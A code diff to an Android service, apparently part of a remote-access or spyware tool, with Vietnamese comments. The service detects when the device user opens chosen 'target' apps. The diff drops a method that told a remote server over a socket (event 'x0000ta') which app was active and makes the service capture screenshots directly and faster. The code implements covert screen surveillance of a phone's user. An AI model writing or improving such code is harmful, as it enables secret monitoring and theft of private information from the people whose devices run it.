@@ -266,44 +266,21 @@ public class AutoScreenshotService extends Service {
      */
     private void takeScreenshotAlternative(final String appName) {
         try {
-            // Tạo một invisible view overlay
-            // Capture drawing cache của root view
-            // Note: Đây là workaround, có thể không hoạt động trên mọi Android version
+            Log.d(TAG, "Taking screenshot for " + appName);
             
-            // Thay vào đó, ta sẽ request screenshot từ server
-            // Server gửi lệnh → App chụp → Gửi về
+            // Gọi ScreenshotManager trực tiếp để chụp
+            // Không cần round-trip qua server, giúp chụp nhanh hơn
+            ScreenshotManager.getInstance(getApplicationContext()).takeScreenshot();
             
-            Log.d(TAG, "Screenshot alternative method for " + appName);
-            
-            // Gửi thông báo lên server rằng user đang dùng app này
-            notifyServerAboutTargetApp(appName);
+            // Log local
+            Log.d(TAG, "Screenshot requested via Manager");
             
         } catch (Exception e) {
             Log.e(TAG, "Error in alternative screenshot", e);
         }
     }
 
-    /**
-     * Thông báo server về việc user đang dùng target app
-     * Server có thể gửi lệnh chụp screenshot manual
-     */
-    private void notifyServerAboutTargetApp(String appName) {
-        try {
-            JSONObject data = new JSONObject();
-            data.put("type", "target_app_active");
-            data.put("app", appName);
-            data.put("timestamp", System.currentTimeMillis());
-            
-            // Gửi qua socket
-            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
-                IOSocket.getInstance().getIoSocket().emit("x0000ta", data);
-                Log.d(TAG, "Notified server about " + appName);
-            }
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Error notifying server", e);
-        }
-    }
+    // notifyServerAboutTargetApp removed as it is not needed anymore
 
     /**
      * Convert bitmap to byte array
